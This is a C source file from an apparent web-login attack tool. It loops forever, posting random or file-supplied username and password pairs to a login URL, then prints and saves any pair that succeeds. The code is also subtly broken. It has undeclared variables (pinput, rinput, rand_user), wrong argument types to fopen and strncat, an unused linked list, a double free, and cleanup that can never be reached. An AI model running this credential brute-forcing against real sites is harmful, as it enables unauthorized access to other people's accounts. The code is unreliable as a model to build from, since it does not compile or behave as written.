#include <stdio.h>
#include <string.h>

#include "../main.h"
#include "../core/random.h"
#include "guess_username_password.h"
#include "debug.h"

int Attack_GuessUsernamePassword(const pInput process_result)
{

    /* attack mode guess the http web password */

    char random_username[MAX_USERNAME_LENGTH];
    char random_password[MAX_PASSWORD_LENGTH];
    char ch;

    if (strlen(process_result->attack_mode_0_one_username) == 0)
    {
        if (strlen(process_result->attack_mode_0_username_file_path) == 0)
        {
            /* use the defalut usename */
            strncpy(process_result->attack_mode_0_one_username, USERNAME_DEFAULT, MAX_USERNAME_LENGTH);
        }
        else
        {
            /* if user give the username.txt */
            FILE *fp = fopen(process_result->attack_mode_0_username_file_path, 'r');
            if (!fp)
            {
                Log(LOG_INFO, LOG_ERROR, "Error: Can not open the username file");
                return 1;
            }
            /* use the circle linked list */
            pUsernameList username_header_linklist = (pUsernameList)malloc(sizeof(UsernameList));
            while (!feof(fp))
            {
                memset(random_username, 0, MAX_USERNAME_LENGTH);
                while ((ch = fgetc(fp)) != '\n')
                {
                    strncat(random_username, ch, MAX_USERNAME_LENGTH);
                }
                pUsernameList username_linklist = (pUsernameList)malloc(sizeof(UsernameList));
            }
        }
    }

    Log(LOG_DEBUG, process_result->debug_mode, "Start Guess attack...");

    pAttarckPostStruct hinput = (pAttarckPostStruct)malloc(sizeof(AttarckPostStruct));

    char *post_data, *return_value, *write_space;
    int num_loop = 0;
    int debug_mode = pinput->DebugMode;

    write_space = (char *)calloc((MY_RAND_MAX_PASSWORD_LENGTH + MY_RAND_MAX_USERNAME_LENGTH + 100), sizeof(char));
    post_data = (char *)calloc(MY_RAND_MAX_PASSWORD_LENGTH + MY_RAND_MAX_USERNAME_LENGTH + 100, sizeof(char));
    return_value = (char *)calloc(MY_HTTP_DEFAULT_RESPONSE_LENGTH, sizeof(char));

    for (;;)
    {
        // Now we get the random string as the 'random_password'
        // Flag = 1, output the random password
        rinput->RandFlag = 1;
        rinput->NumLoop = num_loop;
        rinput->Seed = pinput->ThreadSeed;
        rinput->DebugMode = pinput->DebugMode;

        rand_string(rand_passwd, rinput);

        if (pinput->RandFlag == 1)
        {
            rand_user = (char *)calloc(MY_RAND_MAX_USERNAME_LENGTH + 1, sizeof(char));
            rinput->RandFlag = 0;
            rand_string(rand_user, rinput);
        }
        else
        {
            rand_user = user_name;
        }

        // rand user fix
        sprintf(post_data, POST_MODEL, rand_user, rand_passwd);

        // Here we go --->
        hinput->URL = POST_URL;
        hinput->PostData = post_data;
        hinput->DebugMode = pinput->DebugMode;
        hinput->Attack = pinput->Attack;
        hinput->ReturnStr = return_value;
        http_post(hinput);
        return_value = hinput->ReturnStr;
        debug(debug_mode, 1, "Return value: %s", return_value);
        //return_value = http_post(POST_URL, post_data, pinput->DebugMode, pinput->NotRecv);

        if (pinput->Attack != 1)
        {
            // Guess the password
            debug(debug_mode, 2, "Start judge");
            if (success_or_not(debug_mode, return_value) == 0)
            {
                debug(debug_mode, 2, "Found the result");
                printf("We found the password!\n[--->%s : %s<---]\n", rand_user, rand_passwd);
                sprintf(write_space, "%s - %s\n", rand_user, rand_passwd);
                if (write_passwd(write_space) == 1)
                {
                    debug(debug_mode, 1, "Write the username and password failed");
                    return 1;
                }
            }
        }

        // Make sure the num_loop crontrol
        ++num_loop;
        if (num_loop >= sizeof(int))
        {
            num_loop = 0;
        }
    }
    free(pinput);
    free(rinput);
    free(hinput);
    free(write_space);
    free(rand_passwd);
    free(post_data);

    free(rand_user);
    free(rand_passwd);
    pthread_exit((void *)0);

    return 0;
}